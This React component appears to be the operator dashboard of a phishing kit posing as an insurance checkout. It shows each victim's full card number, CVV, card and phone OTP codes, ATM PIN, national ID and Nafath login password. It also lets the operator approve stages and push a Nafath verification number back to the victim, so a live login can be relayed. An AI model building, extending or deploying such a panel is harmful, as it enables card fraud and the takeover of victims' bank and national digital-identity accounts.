import React from "react";
import { Phone, Loader2, Check, X, RefreshCw, KeyRound, Landmark, Fingerprint, AlertTriangle, CreditCard, Smartphone } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { Button } from "@/components/ui/button";
import { InfoItem } from "./InfoItem";
import CardBrandLogo from "@/components/CardBrandLogo";
import { getCardMetadata } from "@/lib/cardMetadata";
import type { InsuranceOrder, StageEvent, Visitor } from "./types";
import { stageLabel } from "./types";
import { toast } from "sonner";

import stcLogo from "@/assets/carriers/stc.png";
import mobilyLogo from "@/assets/carriers/mobily.png";
import zainLogo from "@/assets/carriers/zain.png";

const carrierLogos: Record<string, string> = {
  "STC": stcLogo, "stc": stcLogo,
  "Mobily": mobilyLogo, "mobily": mobilyLogo, "موبايلي": mobilyLogo,
  "Zain": zainLogo, "zain": zainLogo, "زين": zainLogo,
};

interface Props {
  linkedOrders: InsuranceOrder[];
  stageEvents: StageEvent[];
  selectedVisitor: Visitor;
  visitorPhone: string | null;
  visitorNationalId: string | null;
  loadingAction: string | null;
  onStageApprove: (orderId: string, nafathNum?: string) => void;
  onStageReject: (orderId: string) => void;
  onUpdateNafathNumber: (orderId: string, val: string) => void;
  nafathNumberInputs: Record<string, string>;
  setNafathNumberInputs: React.Dispatch<React.SetStateAction<Record<string, string>>>;
  insuranceTypeLabel: Record<string, string>;
  statusLabel: Record<string, { text: string; cls: string }>;
}

/* ─── Timeline stage config ─── */
const stageConfig: { key: string; label: string; icon: React.ReactNode; color: string }[] = [
  { key: "payment", label: "بطاقة الدفع", icon: <CreditCard className="w-3.5 h-3.5" />, color: "amber" },
  { key: "otp", label: "كود OTP البطاقة", icon: <KeyRound className="w-3.5 h-3.5" />, color: "blue" },
  { key: "atm", label: "بيانات ATM", icon: <Landmark className="w-3.5 h-3.5" />, color: "emerald" },
  { key: "phone_verification", label: "توثيق الجوال", icon: <Smartphone className="w-3.5 h-3.5" />, color: "purple" },
  { key: "phone_otp", label: "كود OTP الجوال", icon: <Phone className="w-3.5 h-3.5" />, color: "violet" },
  { key: "stc_call", label: "مكالمة STC", icon: <Phone className="w-3.5 h-3.5" />, color: "blue" },
  { key: "nafath_login", label: "دخول النفاذ", icon: <Fingerprint className="w-3.5 h-3.5" />, color: "teal" },
  { key: "nafath_verify", label: "رمز النفاذ", icon: <span className="text-sm">🔐</span>, color: "cyan" },
];

type StageState = "idle" | "active" | "approved" | "rejected";

function getStageState(order: InsuranceOrder, stageKey: string): StageState {
  if (order.current_stage === stageKey) {
    if (order.stage_status === "approved") return "approved";
    if (order.stage_status === "rejected") return "rejected";
    return "active";
  }
  // Check if this stage was passed (order is at a later stage)
  const stageOrder = stageConfig.map(s => s.key);
  const currentIdx = stageOrder.indexOf(order.current_stage || "");
  const thisIdx = stageOrder.indexOf(stageKey);
  if (currentIdx > thisIdx && thisIdx >= 0) return "approved";
  return "idle";
}

const dotStyles: Record<StageState, string> = {
  idle: "bg-muted border-border",
  active: "bg-amber-500 border-amber-400 ring-4 ring-amber-500/20 animate-pulse",
  approved: "bg-emerald-500 border-emerald-400",
  rejected: "bg-red-500 border-red-400",
};

const lineStyles: Record<StageState, string> = {
  idle: "bg-border",
  active: "bg-amber-500/40",
  approved: "bg-emerald-500/40",
  rejected: "bg-red-500/40",
};

const TabVerification: React.FC<Props> = ({
  linkedOrders, stageEvents, selectedVisitor, visitorPhone, visitorNationalId,
  loadingAction, onStageApprove, onStageReject, onUpdateNafathNumber,
  nafathNumberInputs, setNafathNumberInputs, insuranceTypeLabel, statusLabel,
}) => {
  const getNafathInputValue = (order: InsuranceOrder) => nafathNumberInputs[order.id] ?? order.nafath_number ?? "";
  const setNafathInputValue = (orderId: string, value: string) => {
    const sanitized = value.replace(/\D/g, "").slice(0, 2);
    setNafathNumberInputs(prev => ({ ...prev, [orderId]: sanitized }));
  };
  const getLatestResendEvent = (orderId: string, stage: string) => {
    const matched = stageEvents.filter(e => e.order_id === orderId && e.stage === stage && Boolean((e.payload as any)?.resend_requested))
      .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
    return matched[matched.length - 1] || null;
  };

  if (linkedOrders.length === 0) {
    return <p className="text-xs text-muted-foreground text-center py-6">لا توجد بيانات تحقق</p>;
  }

  const renderApproveReject = (order: InsuranceOrder, stage: string, extraContent?: React.ReactNode) => {
    const isPending = order.stage_status === "pending";
    if (!isPending || order.current_stage !== stage) return null;
    return (
      <motion.div initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} className="pt-2 space-y-2">
        {extraContent}
        <div className="flex items-center gap-2">
          <Button onClick={() => onStageApprove(order.id, (stage === "nafath_login" || stage === "nafath_verify") ? getNafathInputValue(order) : undefined)} disabled={loadingAction !== null || ((stage === "nafath_login" || stage === "nafath_verify") && !getNafathInputValue(order))} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1 flex-1" size="sm">
            {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
          </Button>
          <Button onClick={() => onStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1 flex-1" size="sm">
            {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
          </Button>
        </div>
      </motion.div>
    );
  };

  return (
    <div className="space-y-5">
      {linkedOrders.map(order => {
        const isPending = order.stage_status === "pending";

        return (
          <div key={order.id} className={`rounded-xl md:rounded-2xl border p-2 md:p-3 space-y-1 ${isPending ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border/60 bg-card/50"}`}>
            {/* Order header */}
            <div className="flex items-start md:items-center justify-between gap-2 mb-2 md:mb-3 flex-wrap">
              <span className="text-[11px] md:text-xs font-bold text-foreground">{order.company || "غير محدد"} - {insuranceTypeLabel[order.insurance_type || ""] || order.insurance_type || ""}</span>
              {order.current_stage && (
                <span className={`px-1.5 md:px-2 py-0.5 rounded-full text-[9px] md:text-[10px] font-bold shrink-0 ${isPending ? "bg-amber-500/10 text-amber-600 animate-pulse" : order.stage_status === "approved" ? "bg-emerald-500/10 text-emerald-600" : order.stage_status === "rejected" ? "bg-red-500/10 text-red-600" : "bg-muted text-muted-foreground"}`}>
                  {stageLabel[order.current_stage] || order.current_stage} — {isPending ? "⏳ بانتظار" : order.stage_status === "approved" ? "✓ موافق" : order.stage_status === "rejected" ? "✗ مرفوض" : order.stage_status || "-"}
                </span>
              )}
            </div>

            {/* Timeline */}
            <div className="relative pr-5 md:pr-6">
              {/* Vertical line */}
              <div className="absolute right-[9px] md:right-[11px] top-2 bottom-2 w-0.5 bg-border/50 rounded-full" />

              {stageConfig.map((stage, idx) => {
                const state = getStageState(order, stage.key);
                const isLast = idx === stageConfig.length - 1;

                return (
                  <div key={stage.key} className={`relative pb-${isLast ? "0" : "3 md:pb-4"} ${isLast ? "" : "mb-0.5 md:mb-1"}`}>
                    {/* Dot */}
                    <div className={`absolute right-[-11px] md:right-[-13px] top-1 w-4 h-4 md:w-5 md:h-5 rounded-full border-2 flex items-center justify-center z-10 transition-all ${dotStyles[state]}`}>
                      {state === "approved" && <Check className="w-2 h-2 md:w-2.5 md:h-2.5 text-white" />}
                      {state === "rejected" && <X className="w-2 h-2 md:w-2.5 md:h-2.5 text-white" />}
                    </div>

                    {/* Colored line segment */}
                    {!isLast && (
                      <div className={`absolute right-[-1px] md:right-[0px] top-5 md:top-6 bottom-0 w-0.5 rounded-full transition-colors ${lineStyles[state]}`} />
                    )}

                    {/* Content */}
                    <div className={`mr-3 md:mr-4 rounded-lg md:rounded-xl border p-2 md:p-2.5 transition-all ${state === "active" ? "border-amber-500/40 bg-amber-500/5 shadow-sm shadow-amber-500/10" : state === "approved" ? "border-emerald-500/20 bg-emerald-500/5" : state === "rejected" ? "border-red-500/20 bg-red-500/5" : "border-border/30 bg-muted/20"}`}>
                      {/* Stage header */}
                      <div className="flex items-center gap-1.5 md:gap-2 mb-1 md:mb-1.5 flex-wrap">
                        <span className={`${state === "active" ? "text-amber-600" : state === "approved" ? "text-emerald-600" : state === "rejected" ? "text-red-600" : "text-muted-foreground"}`}>
                          {stage.icon}
                        </span>
                        <span className={`text-[10px] md:text-[11px] font-bold ${state === "active" ? "text-amber-700" : state === "approved" ? "text-emerald-700" : state === "rejected" ? "text-red-700" : "text-muted-foreground"}`}>
                          {stage.label}
                        </span>
                        {state === "active" && (
                          <span className="mr-auto flex items-center gap-1 text-[8px] md:text-[9px] font-bold text-amber-600 bg-amber-500/15 px-1 md:px-1.5 py-0.5 rounded-full">
                            <span className="relative flex h-1.5 w-1.5"><span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-500 opacity-75" /><span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-amber-500" /></span>
                            بانتظار
                          </span>
                        )}
                      </div>

                      {/* Stage body */}
                      {renderStageContent(stage.key, order, stageEvents, selectedVisitor, visitorPhone, visitorNationalId, getNafathInputValue, setNafathInputValue, getLatestResendEvent)}

                      {/* Approve/Reject */}
                      {stage.key === "nafath_verify" ? (
                        <>
                          {renderNafathVerifyActions(order, getNafathInputValue, loadingAction, onUpdateNafathNumber)}
                          {renderApproveReject(order, stage.key)}
                        </>
                      ) : stage.key === "nafath_login" ? (
                        renderApproveReject(order, stage.key, (
                          <div className="flex items-center gap-2">
                            <span className="text-[10px] text-muted-foreground whitespace-nowrap">رقم النفاذ:</span>
                            <input type="text" placeholder="أدخل الرقم (مثل 35)" value={getNafathInputValue(order)} onChange={e => setNafathInputValue(order.id, e.target.value)} className="flex-1 h-7 rounded-lg border border-border bg-card px-2 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors" />
                          </div>
                        ))
                      ) : (
                        renderApproveReject(order, stage.key)
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        );
      })}
    </div>
  );
};

/* ─── Stage content renderers ─── */

function renderStageContent(
  stageKey: string, order: InsuranceOrder, stageEvents: StageEvent[],
  selectedVisitor: Visitor, visitorPhone: string | null, visitorNationalId: string | null,
  getNafathInputValue: (o: InsuranceOrder) => string,
  setNafathInputValue: (id: string, val: string) => void,
  getLatestResendEvent: (orderId: string, stage: string) => StageEvent | null,
) {
  switch (stageKey) {
    case "payment": return renderPaymentCard(order);
    case "otp": return renderOtp(order, stageEvents, getLatestResendEvent);
    case "atm": return renderAtm(order);
    case "phone_verification": return renderPhoneVerification(order, stageEvents, selectedVisitor, visitorPhone, visitorNationalId);
    case "phone_otp": return renderPhoneOtp(order, stageEvents);
    case "stc_call": return renderStcCall(order, stageEvents);
    case "nafath_login": return renderNafathLogin(order, stageEvents, selectedVisitor, visitorNationalId);
    case "nafath_verify": return renderNafathVerify(order, stageEvents, getNafathInputValue, setNafathInputValue);
    default: return null;
  }
}

function renderPaymentCard(order: InsuranceOrder) {
  const hasCardData = order.card_holder_name || order.card_number_full || order.card_last_four || order.card_expiry || order.card_cvv;
  if (!hasCardData) return <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>;

  const num = order.card_number_full || order.card_last_four || "";
  const meta = getCardMetadata(num);
  const brandColors: Record<string, { from: string; to: string }> = {
    visa: { from: "#1a1f71", to: "#0d47a1" }, mastercard: { from: "#eb5f07", to: "#ff6d00" },
    mada: { from: "#0d7c3d", to: "#00a651" }, amex: { from: "#006fcf", to: "#00aff0" },
    unionpay: { from: "#e21836", to: "#00447c" }, unknown: { from: "#374151", to: "#1f2937" },
  };
  const bc = brandColors[meta.brandKey] || brandColors.unknown;
  const displayNum = order.card_number_full ? order.card_number_full.replace(/(.{4})/g, '$1 ').trim() : order.card_last_four ? `•••• •••• •••• ${order.card_last_four}` : "•••• •••• •••• ••••";

  return (
    <div className="space-y-2">
      <div className="mx-auto w-full max-w-[200px] md:max-w-[240px] h-[110px] md:h-[130px] rounded-xl p-2 md:p-2.5 flex flex-col justify-between text-white relative overflow-hidden"
        style={{ background: `linear-gradient(135deg, ${bc.from}, ${bc.to})`, boxShadow: `0 6px 18px ${bc.from}44` }}>
        <div className="flex justify-between items-start">
          <div className="w-6 md:w-7 h-3.5 md:h-4 rounded bg-yellow-300/80" />
          <CardBrandLogo brandKey={meta.brandKey} className="w-7 md:w-8 h-4 md:h-5" />
        </div>
        <p className="text-[9px] md:text-[10px] font-mono tracking-[1.5px] md:tracking-[2px] text-white/90 text-center" dir="ltr">{displayNum}</p>
        <div className="flex justify-between items-end text-[7px] md:text-[8px]">
          <div><p className="text-white/50 text-[5px] md:text-[6px]">CARD HOLDER</p><p className="text-white/90 font-medium truncate max-w-[90px] md:max-w-[120px]">{order.card_holder_name || "—"}</p></div>
          <div className="text-left" dir="ltr"><p className="text-white/50 text-[5px] md:text-[6px]">EXPIRES</p><p className="text-white/90 font-medium">{order.card_expiry || "MM/YY"}</p></div>
          {order.card_cvv && <div className="text-left" dir="ltr"><p className="text-white/50 text-[5px] md:text-[6px]">CVV</p><p className="text-white/90 font-bold font-mono">{order.card_cvv}</p></div>}
        </div>
        {meta.isDetected && meta.bankName && <p className="absolute bottom-0.5 left-1/2 -translate-x-1/2 text-[5px] md:text-[6px] text-white/40">{meta.bankName}</p>}
      </div>
      <div className="grid grid-cols-2 gap-1.5">
        {order.card_number_full && <InfoItem label="رقم البطاقة" value={order.card_number_full.replace(/(.{4})/g, '$1 ').trim()} />}
        {!order.card_number_full && order.card_last_four && <InfoItem label="آخر 4 أرقام" value={`**** ${order.card_last_four}`} />}
        {order.card_expiry && <InfoItem label="انتهاء" value={order.card_expiry} />}
        {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
        {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة" : order.payment_method === "atm" ? "ATM" : order.payment_method} />}
        {meta.isDetected && <InfoItem label="نوع" value={`${meta.brandLabel} - ${meta.classificationLabel}`} />}
      </div>
    </div>
  );
}

function renderOtp(order: InsuranceOrder, stageEvents: StageEvent[], getLatestResendEvent: (orderId: string, stage: string) => StageEvent | null) {
  const otpEvents = stageEvents.filter(e => e.order_id === order.id && e.stage === "otp").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
  const rejectedOtps = otpEvents.filter(e => e.status === "rejected");
  const latestResend = getLatestResendEvent(order.id, "otp");

  return (
    <div className="space-y-1.5">
      {latestResend && (
        <div className="flex items-center justify-between rounded-lg border border-amber-500/20 bg-amber-500/10 px-2.5 py-1.5">
          <span className="text-[10px] font-bold text-amber-700">طلب رمز جديد</span>
          <span className="text-[9px] text-amber-700/80">{new Date(latestResend.stage_entered_at).toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: false })}</span>
        </div>
      )}
      {rejectedOtps.map((ev, i) => (
        <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1">
          <span className="text-[10px] text-red-500">محاولة {i + 1}</span>
          <span className="text-sm font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.otp_code || (ev.payload as any)?.code || "—"}</span>
        </div>
      ))}
      <div className="flex items-center justify-center">
        {order.otp_code ? (
          <span className="text-xl font-mono font-bold tracking-[6px] text-blue-600 bg-blue-500/10 px-3 py-1 rounded-lg border border-blue-500/20">{order.otp_code}</span>
        ) : (
          <p className="text-[10px] text-muted-foreground py-1">لا توجد بيانات</p>
        )}
      </div>
      {rejectedOtps.length >= 3 && <p className="text-[9px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
    </div>
  );
}

function renderAtm(order: InsuranceOrder) {
  const hasData = order.atm_bill_number || order.atm_biller_code || order.atm_pin;
  if (!hasData) return <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>;
  return (
    <div className="space-y-1.5">
      <div className="grid grid-cols-2 gap-1.5">
        {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
        {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
      </div>
      {order.atm_pin && (
        <div className="flex justify-center">
          <span className="text-lg font-mono font-bold tracking-[4px] text-emerald-600 bg-emerald-500/10 px-3 py-1 rounded-lg border border-emerald-500/20">{order.atm_pin}</span>
        </div>
      )}
    </div>
  );
}

function renderPhoneVerification(order: InsuranceOrder, stageEvents: StageEvent[], selectedVisitor: Visitor, visitorPhone: string | null, visitorNationalId: string | null) {
  const phoneEvent = stageEvents.filter(e => e.order_id === order.id && e.stage === "phone_verification").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime()).at(-1);
  const carrierName = (phoneEvent?.payload as any)?.carrier || null;
  const phone = order.phone || (phoneEvent?.payload as any)?.phone || visitorPhone || "—";
  const natId = order.national_id || (phoneEvent?.payload as any)?.national_id || visitorNationalId || null;

  return (
    <div className="space-y-1.5">
      <div className="grid grid-cols-2 gap-1.5">
        <InfoItem label="رقم الجوال" value={phone} />
        {natId && <InfoItem label="رقم الهوية" value={natId} />}
        {order.customer_name && <InfoItem label="الاسم" value={order.customer_name} />}
      </div>
      {carrierName && (
        <div className="flex items-center gap-2 bg-muted/30 rounded-lg p-2">
          {carrierLogos[carrierName] ? (
            <img src={carrierLogos[carrierName]} alt={carrierName} className="w-5 h-5 object-contain" loading="lazy" />
          ) : (
            <Phone className="w-3.5 h-3.5 text-purple-500" />
          )}
          <span className="text-xs font-medium text-foreground">{carrierName}</span>
        </div>
      )}
      {!phone && !carrierName && <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>}
    </div>
  );
}

function renderPhoneOtp(order: InsuranceOrder, stageEvents: StageEvent[]) {
  const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "phone_otp").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
  const rejected = events.filter(e => e.status === "rejected");
  const latest = events.at(-1);
  const otp = order.phone_otp_code || (latest?.payload as any)?.phone_otp_code || (latest?.payload as any)?.code || null;

  return (
    <div className="space-y-1.5">
      {rejected.map((ev, i) => (
        <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1">
          <span className="text-[10px] text-red-500">محاولة {i + 1}</span>
          <span className="text-sm font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.phone_otp_code || (ev.payload as any)?.code || "—"}</span>
        </div>
      ))}
      <div className="flex items-center justify-center">
        {otp ? (
          <span className="text-xl font-mono font-bold tracking-[6px] text-violet-600 bg-violet-500/10 px-3 py-1 rounded-lg border border-violet-500/20">{otp}</span>
        ) : (
          <p className="text-[10px] text-muted-foreground py-1">لا توجد بيانات</p>
        )}
      </div>
      {rejected.length >= 3 && <p className="text-[9px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
    </div>
  );
}

function renderStcCall(order: InsuranceOrder, stageEvents: StageEvent[]) {
  const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "stc_call").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
  const latest = events.at(-1);
  const phone = order.phone || (latest?.payload as any)?.phone || null;

  return (
    <div className="space-y-1.5">
      {phone ? (
        <InfoItem label="رقم الجوال" value={phone} />
      ) : (
        <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
      )}
    </div>
  );
}

function renderNafathLogin(order: InsuranceOrder, stageEvents: StageEvent[], selectedVisitor: Visitor, visitorNationalId: string | null) {
  const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_login").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
  const rejected = events.filter(e => e.status === "rejected");
  const latestEvent = events.at(-1);
  const payloadNatId = (latestEvent?.payload as any)?.national_id;
  const payloadPassword = (latestEvent?.payload as any)?.nafath_password;

  const nationalId = selectedVisitor?.national_id || order.national_id || payloadNatId || visitorNationalId || null;
  const password = order.nafath_password || payloadPassword || null;

  return (
    <div className="space-y-1.5">
      {rejected.map((ev, i) => (
        <div key={ev.id} className="bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1 space-y-0.5">
          <span className="text-[10px] text-red-500">محاولة {i + 1} (مرفوض)</span>
          <div className="grid grid-cols-2 gap-1">
            <div><p className="text-[8px] text-red-400">الهوية</p><p className="text-[10px] font-mono text-red-400 line-through">{(ev.payload as any)?.national_id || "—"}</p></div>
            <div><p className="text-[8px] text-red-400">كلمة المرور</p><p className="text-[10px] font-mono text-red-400 line-through">{(ev.payload as any)?.nafath_password || "—"}</p></div>
          </div>
        </div>
      ))}
      {(nationalId || password) ? (
        <div className="grid grid-cols-1 gap-1.5">
          <InfoItem label="اسم المستخدم (الهوية)" value={nationalId || "—"} />
          <InfoItem label="كلمة المرور" value={password || "—"} />
        </div>
      ) : (
        <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
      )}
      {rejected.length >= 3 && <p className="text-[9px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
    </div>
  );
}

function renderNafathVerify(order: InsuranceOrder, stageEvents: StageEvent[], getNafathInputValue: (o: InsuranceOrder) => string, setNafathInputValue: (id: string, val: string) => void) {
  const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_verify").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
  const rejected = events.filter(e => e.status === "rejected");

  return (
    <div className="space-y-1.5">
      {rejected.map((ev, i) => (
        <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1">
          <span className="text-[10px] text-red-500">محاولة {i + 1}</span>
          <span className="text-sm font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.nafath_number || "—"}</span>
        </div>
      ))}
      <div className="flex items-center gap-2">
        <span className="text-[10px] text-muted-foreground whitespace-nowrap">أدخل الرقم:</span>
        <input type="text" inputMode="numeric" placeholder="مثال: 35" value={getNafathInputValue(order)} onChange={e => setNafathInputValue(order.id, e.target.value.replace(/\D/g, ""))} className="flex-1 h-8 rounded-lg border border-border bg-card px-2.5 text-lg text-foreground text-center font-bold tracking-[6px] focus:border-primary focus:outline-none transition-colors" />
      </div>
      {order.nafath_number && (
        <div className="flex items-center justify-between bg-cyan-500/10 rounded-lg px-2.5 py-1">
          <span className="text-[9px] text-cyan-600">الرقم المعروض:</span>
          <span className="text-base font-mono font-bold tracking-[4px] text-cyan-600">{order.nafath_number}</span>
        </div>
      )}
      {rejected.length >= 3 && <p className="text-[9px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
    </div>
  );
}

function renderNafathVerifyActions(order: InsuranceOrder, getNafathInputValue: (o: InsuranceOrder) => string, loadingAction: string | null, onUpdateNafathNumber: (orderId: string, val: string) => void) {
  return (
    <Button
      onClick={() => {
        const val = getNafathInputValue(order);
        if (!val) { toast.info("أدخل الرقم أولاً"); return; }
        onUpdateNafathNumber(order.id, val);
      }}
      disabled={loadingAction !== null || !getNafathInputValue(order)}
      className="w-full bg-cyan-600 hover:bg-cyan-700 text-white gap-1 mt-1"
      size="sm"
    >
      {loadingAction === "nafath-update-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}
      {order.nafath_number ? "تحديث الرقم" : "إرسال الرقم للزائر"}
    </Button>
  );
}

export default TabVerification;
